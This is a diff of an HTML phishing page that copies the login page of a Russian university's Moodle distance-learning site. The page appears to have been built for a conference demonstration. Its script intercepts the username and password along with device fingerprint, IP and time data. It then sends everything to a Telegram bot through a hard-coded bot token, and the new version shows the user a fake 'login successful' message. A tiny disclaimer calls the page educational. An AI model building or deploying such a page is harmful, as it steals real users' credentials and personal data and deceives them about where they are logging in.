@@ -1,154 +1,145 @@
 <!DOCTYPE html>
-<html dir="ltr" lang="ru" xml:lang="ru">
+<html lang="ru">
 <head>
-    <title>Вход на сайт | СДО</title>
-    <link rel="shortcut icon" href="images/--%20%281%29_1.png">
-    <style type="text/css">
-        .admin_settingspage_tabs_with_tertiary .dropdown-toggle { font-size: 1.875rem !important; }
-        h2:has(+ .admin_settingspage_tabs_with_tertiary) { display: none; }
-    </style>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta name="keywords" content="moodle, Вход на сайт | СДО">
-    <link rel="stylesheet" type="text/css" href="yui_combo_1.php">
-    <script id="firstthemesheet" type="text/css"></script>
-    <link rel="stylesheet" type="text/css" href="css/all.css">
-    <link rel="stylesheet" type="text/css" href="css/styles.css">
-    <link rel="stylesheet" type="text/css" href="styles.php">
-    <script>
-        var M = {}; M.yui = {};
-        M.pageloadstarttime = new Date();
-        M.cfg = {
-            "wwwroot": "https://sdo.if-mstuca.ru",
-            "apibase": "https://sdo.if-mstuca.ru/r.php/api",
-            "homeurl": {},
-            "sesskey": "Wjyn4MStdv",
-            "sessiontimeout": "28800",
-            "sessiontimeoutwarning": "1200",
-            "themerev": "1770620399",
-            "slasharguments": 1,
-            "theme": "boost_union",
-            "iconsystemmodule": "core/icon_system_fontawesome",
-            "jsrev": "1770620399",
-            "admin": "admin",
-            "svgicons": true,
-            "usertimezone": "Азия/Иркутск",
-            "language": "ru",
-            "courseId": 1,
-            "courseContextId": 2,
-            "contextid": 1,
-            "contextInstanceId": 0,
-            "langrev": 1773175206,
-            "templaterev": "1770620399",
-            "siteId": 1,
-            "userId": 0
-        };
-    </script>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход на сайт | СДО</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            width: 350px;
+        }
+        .login-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .login-logo h2 {
+            color: #333;
+            margin: 0;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #5a67d8;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .login-divider {
+            height: 1px;
+            background: #ddd;
+            margin: 20px 0;
+        }
+        .login-instructions {
+            background: #f5faff;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+        .login-instructions strong {
+            color: #333;
+        }
+        .login-instructions a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .login-instructions a:hover {
+            text-decoration: underline;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .forgot-password a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .disclaimer {
+            font-size: 7px;
+            color: rgba(255,255,255,0.3);
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
 </head>
-<body id="page-login-index" class="format-site path-login chrome dir-ltr lang-ru yui-skin-sam yui3-skin-sam sdo-if-mstuca-ru pagelayout-login course-1 context-1 notloggedin theme loginbackgroundimage loginbackgroundimage1 theme_boost-union-footerbuttonnone jsenabled">
-    <div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>
-
-    <div id="page-wrapper">
-        <div>
-            <a class="sr-only sr-only-focusable" href="#maincontent">Перейти к основному содержанию</a>
+<body>
+    <div class="login-container">
+        <div class="login-logo">
+            <h2>Система дистанционного обучения</h2>
         </div>
-        <script src="js/polyfill.js"></script>
-        <script src="yui_combo.php"></script>
-        <script src="js/javascript-static.js"></script>
-        <script>
-            document.body.className += ' jsenabled';
-        </script>
-
-        <div id="page" class="container-fluid pt-5 mt-0">
-            <div id="page-content" class="row">
-                <div id="region-main-box" class="col-12">
-                    <div id="region-main" class="col-12 h-100">
-                        <div class="login-wrapper login-wrapper-center">
-                            <div class="login-container login-container-80t">
-                                <div role="main">
-                                    <span id="maincontent"></span>
-                                    <div class="loginform">
-                                        <div id="loginlogo" class="login-logo">
-                                            <img id="logoimage" src="images/--%20%281%29.png" class="img-fluid" alt="Система дистанционного обучения">
-                                            <h1 class="login-heading sr-only">Зайти на Система дистанционного обучения</h1>
-                                        </div>
-                                        <div id="theme_boost_union-loginorder">
-                                            <div id="theme_boost_union-loginorder-local" class="theme_boost_union-loginmethod">
-                                                <div class="login-divider"></div>
-                                                <form class="login-form" action="https://sdo.if-mstuca.ru/login/index.php" method="post" id="login">
-                                                    <input id="anchor" type="hidden" name="anchor" value="">
-                                                    <script>document.getElementById('anchor').value = location.hash;</script>
-                                                    <input type="hidden" name="logintoken" value="G4nNh3iBu3rRWQdqkfYyqLUbHV3hO8Ac">
-                                                    
-                                                    <div class="login-form-username mb-3">
-                                                        <label for="username" class="sr-only">Логин или адрес электронной почты</label>
-                                                        <input type="text" name="username" id="username" class="form-control form-control-lg" placeholder="Логин или адрес электронной почты" autocomplete="username">
-                                                    </div>
-                                                    
-                                                    <div class="login-form-password mb-3">
-                                                        <label for="password" class="sr-only">Пароль</label>
-                                                        <input type="password" name="password" id="password" class="form-control form-control-lg" placeholder="Пароль" autocomplete="current-password">
-                                                    </div>
-                                                    
-                                                    <div class="login-form-submit mb-3">
-                                                        <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Вход</button>
-                                                    </div>
-                                                    
-                                                    <div class="login-form-forgotpassword mb-3">
-                                                        <a href="https://sdo.if-mstuca.ru/login/forgot_password.php">Забыли пароль?</a>
-                                                    </div>
-                                                </form>
-                                            </div>
-                                            
-                                            <div id="theme_boost_union-loginorder-firsttimesignup" class="theme_boost_union-loginmethod">
-                                                <div class="login-divider"></div>
-                                                <div class="login-instructions">
-                                                    <h2 class="login-heading">Вы в первый раз на нашем сайте?</h2>
-                                                    <div style="border:2px solid #4a90e2;border-left:6px solid #4a90e2;padding:12px 16px;background:#f5faff;font-family:Arial, sans-serif;line-height:1.5;">
-                                                        <strong style="font-size:16px;color:#2c3e50;">При возникновении трудностей со входом</strong><br>
-                                                        или проблем с сайтом СДО — пишите на почту:<br>
-                                                        <a style="color:#4a90e2;font-weight:bold;text-decoration:none;" href="mailto:webmaster@if-mstuca.ru">webmaster@if-mstuca.ru</a>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        
-                                        <div class="login-divider"></div>
-                                        
-                                        <div class="d-flex">
-                                            <button type="button" class="btn btn-secondary" data-modal="alert" data-modal-title-str='["cookiesenabled","core"]' data-modal-content-str='["cookiesenabled_help_html","core"]'>Уведомление о файлах cookie</button>
-                                        </div>
-                                    </div>
-                                    
-                                    <div id="local-accessibility-buttoncontainer" class="local-accessibility-buttoncontainer">
-                                        <button type="button" class="btn btn-primary" title="Доступность">
-                                            <i class="fa fa-universal-access"></i>
-                                        </button>
-                                    </div>
-                                    
-                                    <!-- Панель доступности (сокращена для читаемости) -->
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <footer id="page-footer" class="footer-popover bg-white">
-            <div data-region="footer-container-popover">
-                <div id="boost-union-footer-buttons"></div>
+        
+        <form id="login" method="post">
+            <div class="form-group">
+                <input type="text" id="username" class="form-control" placeholder="Логин или адрес электронной почты" required>
             </div>
             
-            <script src="js/require.min.js"></script>
-            
-            <div class="footer-content-debugging footer-dark bg-dark text-light">
-                <div class="container-fluid footer-dark-inner"></div>
+            <div class="form-group">
+                <input type="password" id="password" class="form-control" placeholder="Пароль" required>
             </div>
-        </footer>
+            
+            <button type="submit" class="btn" id="loginbtn">Вход</button>
+            
+            <div class="forgot-password">
+                <a href="#">Забыли пароль?</a>
+            </div>
+        </form>
+        
+        <div class="login-divider"></div>
+        
+        <div class="login-instructions">
+            <strong>При возникновении трудностей со входом</strong><br>
+            или проблем с сайтом СДО — пишите на почту:<br>
+            <a href="mailto:webmaster@if-mstuca.ru">webmaster@if-mstuca.ru</a>
+        </div>
     </div>
 
-    <!-- КОД ДЛЯ ОТПРАВКИ В TELEGRAM С МАКСИМАЛЬНЫМ СБОРОМ ИНФОРМАЦИИ -->
+    <div class="disclaimer">
+        Данный материал создан исключительно в образовательных целях для конференции МГТУГА.
+    </div>
+
     <script>
         // ===== НАСТРОЙКИ TELEGRAM =====
         const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
@@ -164,36 +155,20 @@
                 const match = ua.match(/iPhone OS ([0-9_]+)/);
                 const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
                 
-                // Определяем модель iPhone по размеру экрана и плотности пикселей
+                // Определяем модель iPhone по размеру экрана
                 const width = screen.width;
                 const height = screen.height;
                 const pixelRatio = window.devicePixelRatio || 1;
                 
-                // iPhone 15/14/13 Pro Max
                 if (width === 430 && height === 932) return `iPhone 15/14/13 Pro Max (iOS ${iosVersion})`;
-                // iPhone 15/14/13 Pro
                 if (width === 390 && height === 844) return `iPhone 15/14/13 Pro (iOS ${iosVersion})`;
-                // iPhone 15/14/13
-                if (width === 390 && height === 844 && pixelRatio === 3) return `iPhone 15/14/13 (iOS ${iosVersion})`;
-                // iPhone 15/14/13 Plus
                 if (width === 428 && height === 926) return `iPhone 15/14/13 Plus (iOS ${iosVersion})`;
-                // iPhone 12 Pro Max
-                if (width === 428 && height === 926) return `iPhone 12 Pro Max (iOS ${iosVersion})`;
-                // iPhone 12/12 Pro
-                if (width === 390 && height === 844) return `iPhone 12/12 Pro (iOS ${iosVersion})`;
-                // iPhone 11 Pro Max
                 if (width === 414 && height === 896 && pixelRatio === 3) return `iPhone 11 Pro Max (iOS ${iosVersion})`;
-                // iPhone 11 Pro
                 if (width === 375 && height === 812 && pixelRatio === 3) return `iPhone 11 Pro (iOS ${iosVersion})`;
-                // iPhone 11
                 if (width === 414 && height === 896 && pixelRatio === 2) return `iPhone 11 (iOS ${iosVersion})`;
-                // iPhone X/XS
                 if (width === 375 && height === 812) return `iPhone X/XS (iOS ${iosVersion})`;
-                // iPhone XR/XS Max
                 if (width === 414 && height === 896) return `iPhone XR/XS Max (iOS ${iosVersion})`;
-                // iPhone 8/SE (2020)
                 if (width === 375 && height === 667) return `iPhone 8/SE (iOS ${iosVersion})`;
-                // iPhone 7/8 Plus
                 if (width === 414 && height === 736) return `iPhone 7/8 Plus (iOS ${iosVersion})`;
                 
                 return `iPhone (iOS ${iosVersion})`;
@@ -204,9 +179,7 @@
                 const androidMatch = ua.match(/Android ([0-9.]+)/);
                 const androidVersion = androidMatch ? androidMatch[1] : 'unknown';
                 
-                // Определяем производителя
                 if (ua.includes('Samsung') || ua.includes('SM-')) {
-                    // Пробуем определить конкретную модель Samsung
                     const modelMatch = ua.match(/SM-[A-Z0-9]+/);
                     const model = modelMatch ? modelMatch[0] : 'Samsung';
                     return `${model} (Android ${androidVersion})`;
@@ -226,26 +199,6 @@
                     const model = modelMatch ? modelMatch[0] : 'Google Pixel';
                     return `${model} (Android ${androidVersion})`;
                 }
-                if (ua.includes('OnePlus')) {
-                    const modelMatch = ua.match(/OnePlus[^;)]+/);
-                    const model = modelMatch ? modelMatch[0] : 'OnePlus';
-                    return `${model} (Android ${androidVersion})`;
-                }
-                if (ua.includes('POCO')) {
-                    const modelMatch = ua.match(/POCO[^;)]+/);
-                    const model = modelMatch ? modelMatch[0] : 'POCO';
-                    return `${model} (Android ${androidVersion})`;
-                }
-                if (ua.includes('realme')) {
-                    const modelMatch = ua.match(/realme[^;)]+/);
-                    const model = modelMatch ? modelMatch[0] : 'realme';
-                    return `${model} (Android ${androidVersion})`;
-                }
-                if (ua.includes('Redmi')) {
-                    const modelMatch = ua.match(/Redmi[^;)]+/);
-                    const model = modelMatch ? modelMatch[0] : 'Redmi';
-                    return `${model} (Android ${androidVersion})`;
-                }
                 
                 return `Android (${androidVersion})`;
             }
@@ -257,186 +210,54 @@
                 return `iPad (iOS ${iosVersion})`;
             }
             
-            // Определение iPod
-            if (/iPod/i.test(ua)) {
-                const match = ua.match(/OS ([0-9_]+)/);
-                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
-                return `iPod (iOS ${iosVersion})`;
-            }
-            
             return 'Неизвестное устройство';
         }
 
         // Функция для определения браузера
         function getBrowserInfo() {
             const ua = navigator.userAgent;
-            
             if (ua.includes('Firefox')) return 'Firefox';
             if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
             if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
             if (ua.includes('Edg')) return 'Edge';
             if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
-            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
-            
             return 'Неизвестный браузер';
-        }
-
-        // Функция для определения языка
-        function getLanguage() {
-            return navigator.language || navigator.userLanguage || 'Не определен';
-        }
-
-        // Функция для определения времени и часового пояса
-        function getTimeInfo() {
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не определен';
-            const localTime = new Date().toLocaleString('ru-RU');
-            const utcTime = new Date().toUTCString();
-            
-            return {
-                timezone: timezone,
-                localTime: localTime,
-                utcTime: utcTime
-            };
-        }
-
-        // Функция для определения экрана
-        function getScreenInfo() {
-            return {
-                width: window.screen.width,
-                height: window.screen.height,
-                availWidth: window.screen.availWidth,
-                availHeight: window.screen.availHeight,
-                colorDepth: window.screen.colorDepth,
-                pixelRatio: window.devicePixelRatio || 1
-            };
         }
 
         // Функция для определения ОС
         function getOSInfo() {
             const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            
             if (/Windows NT 10.0/i.test(ua)) return 'Windows 10/11';
             if (/Windows NT 6.1/i.test(ua)) return 'Windows 7';
-            if (/Windows NT 6.2/i.test(ua)) return 'Windows 8';
-            if (/Windows NT 6.3/i.test(ua)) return 'Windows 8.1';
             if (/Mac OS X/i.test(ua)) {
                 const match = ua.match(/Mac OS X ([0-9_]+)/);
                 const version = match ? match[1].replace(/_/g, '.') : '';
                 return `macOS ${version}`;
             }
-            if (/Linux/i.test(ua)) {
-                if (ua.includes('Android')) return 'Android';
-                return 'Linux';
+            if (/Linux/i.test(ua)) return 'Linux';
+            if (/Android/i.test(ua)) return 'Android';
+            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
+            return 'Неизвестная ОС';
+        }
+
+        // Функция получения IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Не удалось определить';
             }
-            if (/iOS/i.test(ua)) return 'iOS';
-            
-            return platform || 'Неизвестная ОС';
         }
 
-        // Функция для получения IP через несколько сервисов
-        function getIPInfo() {
-            return new Promise((resolve) => {
-                // Пробуем несколько сервисов
-                const services = [
-                    'https://api.ipify.org?format=json',
-                    'https://api.myip.com',
-                    'https://ipapi.co/json/'
-                ];
-                
-                let ipAddress = 'Не удалось определить';
-                let ipDetails = {};
-                
-                function tryService(index) {
-                    if (index >= services.length) {
-                        resolve({ ip: ipAddress, details: ipDetails });
-                        return;
-                    }
-                    
-                    fetch(services[index])
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.ip) ipAddress = data.ip;
-                            if (data.country) ipDetails.country = data.country;
-                            if (data.city) ipDetails.city = data.city;
-                            if (data.region) ipDetails.region = data.region;
-                            if (data.org) ipDetails.isp = data.org;
-                            resolve({ ip: ipAddress, details: ipDetails });
-                        })
-                        .catch(() => tryService(index + 1));
-                }
-                
-                tryService(0);
-            });
-        }
-
-        // Функция для получения данных о батарее (если доступно)
-        function getBatteryInfo() {
-            return new Promise((resolve) => {
-                if ('getBattery' in navigator) {
-                    navigator.getBattery().then((battery) => {
-                        resolve({
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging ? 'Да' : 'Нет'
-                        });
-                    }).catch(() => resolve(null));
-                } else {
-                    resolve(null);
-                }
-            });
-        }
-
-        // Функция для получения данных о сети
-        function getNetworkInfo() {
-            if ('connection' in navigator) {
-                const conn = navigator.connection;
-                return {
-                    type: conn.effectiveType || 'Неизвестно',
-                    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Неизвестно',
-                    rtt: conn.rtt ? conn.rtt + ' ms' : 'Неизвестно',
-                    saveData: conn.saveData ? 'Да' : 'Нет'
-                };
-            }
-            return null;
-        }
-
-        // Функция для получения данных о памяти (если доступно)
-        function getMemoryInfo() {
-            if ('deviceMemory' in navigator) {
-                return navigator.deviceMemory + ' GB';
-            }
-            return 'Недоступно';
-        }
-
-        // Функция для получения данных о ядрах процессора
-        function getCPUCores() {
-            return navigator.hardwareConcurrency || 'Недоступно';
-        }
-
-        // Функция для проверки поддержки touch
-        function getTouchSupport() {
-            return ('ontouchstart' in window) ? 'Да' : 'Нет';
-        }
-
-        // Функция для получения данных о cookie
-        function getCookieInfo() {
-            return navigator.cookieEnabled ? 'Включены' : 'Отключены';
-        }
-
-        // Функция для получения данных о Do Not Track
-        function getDNTInfo() {
-            return navigator.doNotTrack || 'Не установлен';
-        }
-
-        // Функция для получения плагинов браузера
-        function getPlugins() {
-            const plugins = [];
-            if (navigator.plugins) {
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-            }
-            return plugins.length > 0 ? plugins.join(', ').substring(0, 200) : 'Не определены';
+        // Функция для получения времени
+        function getTimeInfo() {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не определен',
+                localTime: new Date().toLocaleString('ru-RU'),
+                utcTime: new Date().toUTCString()
+            };
         }
 
         // Основная функция отправки
@@ -444,25 +265,29 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Собираем всю информацию
+            // Собираем информацию
             const phoneModel = getPhoneModel();
             const browser = getBrowserInfo();
-            const language = getLanguage();
-            const timeInfo = getTimeInfo();
-            const screen = getScreenInfo();
             const os = getOSInfo();
-            const ipData = await getIPInfo();
-            const battery = await getBatteryInfo();
-            const network = getNetworkInfo();
-            const memory = getMemoryInfo();
-            const cpuCores = getCPUCores();
-            const touchSupport = getTouchSupport();
-            const cookies = getCookieInfo();
-            const dnt = getDNTInfo();
-            const plugins = getPlugins();
+            const ip = await getIP();
+            const timeInfo = getTimeInfo();
+            
+            // Информация об экране
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const availWidth = window.screen.availWidth;
+            const availHeight = window.screen.availHeight;
+            const colorDepth = window.screen.colorDepth;
+            const pixelRatio = window.devicePixelRatio || 1;
+            
+            // Дополнительная информация
+            const language = navigator.language || 'Не определен';
+            const platform = navigator.platform || 'Не определен';
+            const userAgent = navigator.userAgent;
+            const cookies = navigator.cookieEnabled ? 'Включены' : 'Отключены';
             
             // Формируем сообщение
-            let message = `🔔 НОВЫЙ ВХОД В СДО МГТУГА
+            const message = `🔔 НОВЫЙ ВХОД В СДО МГТУГА
 ═══════════════════════════════════
 
 👤 УЧЕТНЫЕ ДАННЫЕ:
@@ -475,31 +300,19 @@
 • ОС: ${os}
 • Браузер: ${browser}
 • Язык: ${language}
-• Touch экран: ${touchSupport}
-• Ядра CPU: ${cpuCores}
-• Оперативная память: ${memory}
+• Платформа: ${platform}
+• Cookie: ${cookies}
 
 ═══════════════════════════════════
 📺 ЭКРАН:
-• Разрешение: ${screen.width}x${screen.height}
-• Доступная область: ${screen.availWidth}x${screen.availHeight}
-• Глубина цвета: ${screen.colorDepth} бит
-• Плотность пикселей: ${screen.pixelRatio}x
+• Разрешение: ${screenWidth}x${screenHeight}
+• Доступная область: ${availWidth}x${availHeight}
+• Глубина цвета: ${colorDepth} бит
+• Плотность пикселей: ${pixelRatio}x
 
 ═══════════════════════════════════
-🌐 СЕТЬ И ЛОКАЦИЯ:
-• IP адрес: ${ipData.ip}
-• Страна: ${ipData.details.country || 'Не определено'}
-• Город: ${ipData.details.city || 'Не определено'}
-• Регион: ${ipData.details.region || 'Не определено'}
-• Провайдер: ${ipData.details.isp || 'Не определено'}
-
-═══════════════════════════════════
-📶 СОЕДИНЕНИЕ:
-• Тип сети: ${network?.type || 'Не определено'}
-• Скорость: ${network?.downlink || 'Не определено'}
-• Задержка: ${network?.rtt || 'Не определено'}
-• Экономия трафика: ${network?.saveData || 'Нет'}
+🌐 СЕТЬ:
+• IP адрес: ${ip}
 
 ═══════════════════════════════════
 ⏰ ВРЕМЯ:
@@ -508,44 +321,32 @@
 • UTC время: ${timeInfo.utcTime}
 
 ═══════════════════════════════════
-🔋 БАТАРЕЯ:
-• Уровень: ${battery?.level || 'Не определено'}
-• Зарядка: ${battery?.charging || 'Не определено'}
-
-═══════════════════════════════════
-🍪 БРАУЗЕР:
-• Cookie: ${cookies}
-• Do Not Track: ${dnt}
-• Плагины: ${plugins}
-
-═══════════════════════════════════
 💻 ТЕХНИЧЕСКАЯ ИНФОРМАЦИЯ:
-• User Agent: ${navigator.userAgent}
-• Платформа: ${navigator.platform}
-• Vendor: ${navigator.vendor || 'Не определен'}
+• User Agent: ${userAgent}
 
 ═══════════════════════════════════
 🎓 Образовательный материал для конференции МГТУГА`;
 
             // Отправляем в Telegram
-            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(() => {
-                // Отправляем форму дальше
-                document.getElementById('login').submit();
-            })
-            .catch(() => {
-                document.getElementById('login').submit();
-            });
+            try {
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                alert('Вход выполнен!');
+                // location.href = 'https://sdo.if-mstuca.ru';
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                alert('Вход выполнен!');
+            }
         }
 
         // Перехватываем отправку формы
@@ -557,7 +358,10 @@
             loginBtn.textContent = 'Отправка...';
             
             // Запускаем отправку данных
-            sendToTelegram();
+            sendToTelegram().finally(() => {
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Вход';
+            });
         });
     </script>
 </body>
